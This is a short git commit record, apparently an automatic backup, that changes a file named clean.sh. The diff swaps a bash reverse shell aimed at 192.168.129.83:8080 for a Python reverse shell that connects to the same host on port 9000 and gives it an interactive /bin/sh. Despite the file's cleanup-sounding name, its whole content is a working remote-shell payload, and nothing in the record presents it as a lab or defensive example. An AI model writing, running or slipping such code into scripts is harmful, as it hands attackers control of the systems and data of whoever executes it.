d16f067113f18e0669c22da752a7d1b7e18b35c9
Punish3r7 <mostafakamalanna88@gmail.com.com>
2026-04-17 18:20:01 +0600

    Auto backup: 2026-04-17 18:20

--- Anonymous/clean.sh
+++ Anonymous/clean.sh
@@ -1,2 +1,2 @@
-bash -i >& /dev/tcp/192.168.129.83/8080 0>&1
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.129.83 ",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
